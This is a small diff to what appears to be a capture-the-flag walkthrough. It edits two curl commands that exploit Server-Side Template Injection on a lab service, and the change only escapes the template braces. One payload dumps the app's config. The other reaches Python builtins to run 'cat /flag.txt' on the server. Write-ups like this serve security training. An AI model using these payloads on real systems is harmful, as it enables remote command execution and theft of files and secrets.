@@ -457,8 +457,8 @@ The internal service is vulnerable to Server-Side Template Injection (SSTI). We 
 
 ```bash
 # Read the flag file
-curl "http://mbptl-app:5000/?name={{config.items()}}"
-curl "http://mbptl-app:5000/?name={{request.application.__globals__.__builtins__.__import__('os').popen('cat+/flag.txt').read()}}"
+curl "http://mbptl-app:5000/?name=\{\{config.items()\}\}"
+curl "http://mbptl-app:5000/?name=\{\{request.application.__globals__.__builtins__.__import__('os').popen('cat+/flag.txt').read()\}\}"
 ```
 
 ### Alternative: Direct File Access
